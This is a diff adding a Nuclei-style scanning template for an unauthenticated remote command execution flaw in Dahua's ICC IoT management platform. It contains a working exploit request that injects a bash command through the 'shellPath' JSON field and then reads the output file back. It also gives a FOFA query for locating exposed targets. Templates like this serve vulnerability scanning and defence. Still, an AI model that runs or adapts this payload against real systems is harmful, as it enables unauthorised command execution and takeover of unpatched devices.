@@ -1,0 +1,52 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - uid=
+            - gid=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /evo-runs/v1.0/push HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+          Content-Type: application/json
+          X-Subject-Headerflag: ADAPT
+
+          {
+            "method": "agent.ossm.mapping.config",
+            "info": {
+              "configure": "abcd",
+              "filePath": "haha",
+              "paramMap": {
+                "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{username}}.txt",
+                "filePath": "abc"
+              },
+              "requestIp": ""
+            }
+          }
+        - |
+          GET /static/{{username}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+id: dahua-icc-push-rce
+info:
+    author: Superhero
+    description: |-
+        fofa: body="*客户端会小于800*" || icon_hash="-1935899595"
+        大华智能物联综合管理平台 icc push 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
+    name: 大华智能物联综合管理平台 icc push 远程命令执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/t_xTEvYKO1Rn6_oSbvWbtQ
+    severity: high
+    tags:
+        - Dahua-ICC
+        - dahua
+        - 大华智能物联综合管理平台
+variables:
+    username: '{{to_lower(rand_base(6))}}'
